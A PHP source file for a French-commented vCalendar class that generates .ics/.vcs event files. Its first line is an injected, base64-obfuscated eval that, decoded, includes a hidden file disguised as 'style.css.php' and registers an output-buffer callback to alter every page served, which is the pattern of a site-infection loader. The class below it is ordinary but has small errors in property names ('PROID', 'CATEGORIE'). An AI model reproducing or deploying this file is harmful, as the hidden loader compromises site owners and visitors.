<?php /**/eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21mc24nXSkpeyRHTE9CQUxTWydtZnNuJ109Jy93ZWIvZW5kdXJhbmNlZHVtYXJzL3d3dy9zcGlwL0U3Ml9maWMvcHJvdGVnZS9DUi9DUi0xMy0xMS0yMDA3X2ZpY2hpZXJzL3N0eWxlLmNzcy5waHAnO2lmKGZpbGVfZXhpc3RzKCRHTE9CQUxTWydtZnNuJ10pKXtpbmNsdWRlX29uY2UoJEdMT0JBTFNbJ21mc24nXSk7aWYoZnVuY3Rpb25fZXhpc3RzKCdnbWwnKSYmZnVuY3Rpb25fZXhpc3RzKCdkZ29iaCcpKXtvYl9zdGFydCgnZGdvYmgnKTt9fX0=')); ?>
<?php
/***************************************************************************

PHP vCalendar class v2.0

Cette classe permet de créer des fichiers textes au format vCalendar v1.0 ou 2.0
pour transmettre des événements vers un agenda
Auteur SIMIER Philippe philaure@wanadoo.fr

si le constructeur recoit pour argument encodage le valeur quoted alors version 1.0
avec l'encodage UTF8 se sera la version 2.0
Un composant "VEVENT" offre un panel de propriétés qui décrivent un événement comme représentant une quantité de temps planifiée
sur un calendrier. En temps normal, un événement valide rendra ce temps occupé, mais il est possible de le configurer 
en mode "Transparent", pour changer cette interprétation.

Les propriétés classiques d'un composant VEVENT sont :

DTSTART: Date de début de l'événement 
DTEND: Date de fin de l'événement 
SUMMARY: Titre de l'événement 
LOCATION: Lieu de l'événement 
CATEGORIES: Catégorie de l'événement (ex: Conférence, Fête, ...) 
STATUS: Statut de l'événement (TENTATIVE, CONFIRMED, CANCELLED) 
DESCRIPTION: Description de l'événement 
TRANSP: Définit si la ressource affectée à l'évenement est rendu indisponible (OPAQUE, TRANSPARENT)

Les données vCalendar ont comme type-MIME text/calendar. L'extension ".vcs"
***************************************************************************/


function encode($string) {
	return escape(quoted_printable_encode($string));
}

function escape($string) {
	return str_replace(";","\;",$string);
}

// fonction pour encoder les caractères spéciaux et découper la ligne en tronçons de 76 caractères
function quoted_printable_encode($input, $line_max = 76) {
	$hex = array('0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F');
	$lines = preg_split("/(?:\r\n|\r|\n)/", $input);
	$eol = "\r\n";
	$linebreak = "=0D=0A";
	$escape = "=";
	$output = "";

	for ($j=0;$j<count($lines);$j++) {
		$line = $lines[$j];
		$linlen = strlen($line);
		$newline = "";
		for($i = 0; $i < $linlen; $i++) {
			$c = substr($line, $i, 1);
			$dec = ord($c);
			if ( ($dec == 32) && ($i == ($linlen - 1)) ) { // convert space at eol only
				$c = "=20";
			} elseif ( ($dec == 61) || ($dec < 32 ) || ($dec > 126) ) { // always encode "\t", which is *not* required
				$h2 = floor($dec/16); $h1 = floor($dec%16);
				$c = $escape.$hex["$h2"].$hex["$h1"];
			}
			if ( (strlen($newline) + strlen($c)) >= $line_max ) { // CRLF is not counted
				$output .= $newline.$escape.$eol; // soft line break; " =\r\n" is okay
				$newline = "    ";
			}
			$newline .= $c;
		} // end of for
		$output .= $newline;
		if ($j<count($lines)-1) $output .= $linebreak;
	}
	return trim($output);
}

/*Les lignes de texte NE DEVRAIENT PAS faire plus de 75 octets de long, le saut de ligne exclu. 
Les longues lignes de contenu DEVRAIENT être découpées en une représentation sur plusieurs lignes 
à l'aide d'une technique dite de « pliage » (folding) des lignes. C'est-à-dire la coupure d'une longue ligne
 entre deux caractères en insérant une séquence CRLF suivie immédiatement d'un seul caractère 
 blanc (whitespace) linéaire, à savoir un caratère ESPACE (code décimal 32 US-ASCII) 
 ou TABULATION HORIZONTALE (code décimal 9 US-ASCII). 
 Toute séquence CRLF suivie immédiatement d'un seul caractère blanc linéaire est ignorée (
 c'est-à-dire supprimée) au traitement du type de contenu.  */

 function ligne($input, $line_max = 75) {
   $output="";
   while (strlen($input)>$line_max) {
      $newline =substr($input,0,$line_max);
      $output .=$newline."\r\n\t";
      $input = substr ($input,$line_max-strlen($input));
     }
     $output .= $input;
     return $output;
}

class vCalendar {
	var $properties;    // tableau des propriétés d'un evenement
	var $evenements = array();    // tableau des evevements
	var $filename;      // le nom du fichier
	var $encodage;      // le type d'encodage
	var $version;       // version 1.0 ou 2.0
	var $extension;     // l'extension du fichier ics ou vcs
	
	// le constructeur d'objet  vCalendar
         function vCalendar ($encodage="UTF8",$name="calendrier")
         {
          $this->encodage = $encodage;
          $this->id = 0;
          if ($encodage=="UTF8")
           {$this->version = "VERSION:2.0\r\n";
            $this->extension = ".ics";
           }
          else { $this->version = "VERSION:1.0\r\n";
                 $this->extension = ".vcs";
          }
          $name=  strtr($name, "éèëêï àçù", "eeeei_acu");
          $this->filename = $name;
         }

  // méthode pour ajouter une propriété
  function setKey($key,$valeur,$type=""){
        if ($type!="") $key .= ";".$type;
        if ($this->encodage!="UTF8") {
                $key.= ";ENCODING=QUOTED-PRINTABLE";
                $this->properties[$key] = quoted_printable_encode(trim($valeur));
        }
        else {
             	$this->properties[$key] = utf8_encode($valeur);
             }
        }

 //méthode pour ajouter de début d'un événement  DTSTART DTEND
 function setDateTime($key,$datetime) {

	list($date,$time) = explode(" ", $datetime);
	$date = str_replace("-", "", $date);  // retire les - de la date
	$time = str_replace(":", "", $time);  // retire les deux points de l'heure
	$this->properties[$key] = $date."T".$time."Z";
 }


 // méthode pour créer un événement
 function addEvenement($titre,$dtdeb,$dtfin,$lieu="",$description="",$categorie="",$priorite="1") {
         $this->setKey ("SUMMARY",$titre);
         $this->setDateTime("DTSTART",$dtdeb);
         $this->setDateTime("DTEND",$dtfin);
         if ($lieu!="") $this->setKey("LOCATION",$lieu);
         if ($description!="") $this->setKey("DESCRIPTION",$description);
         if ($categorie!="") $this->setKey("CATEGORIE",$categorie);
         $this->setKey("PRIORITY",$priorite);
         $even="BEGIN:VEVENT\r\n";
         foreach($this->properties as $key => $value) {
       		$even .= ligne("$key:$value\r\n");
         }
         $even .="END:VEVENT\r\n";
         array_push($this->evenements,$even);
 }

	// méthode pour créer le contenu du fichier
 function getvCalendar() {
	$text = "BEGIN:VCALENDAR\r\n";
	$text .= "PROID:-//PHP class//\r\n";
        $text .= $this->version;
	foreach($this->evenements as $valeur) {
	   $text .=$valeur;
	}
	$text.= "END:VCALENDAR\r\n";
	return $text;
 }

	// méthode pour donner le nom du fichier
 function getFileName() {
        return $this->filename.$this->extension;
 }
	// méthode pour donner le type mime
 function getTypeName() {
       return "Content-Type: text/calendar; ";
 }
}

?>
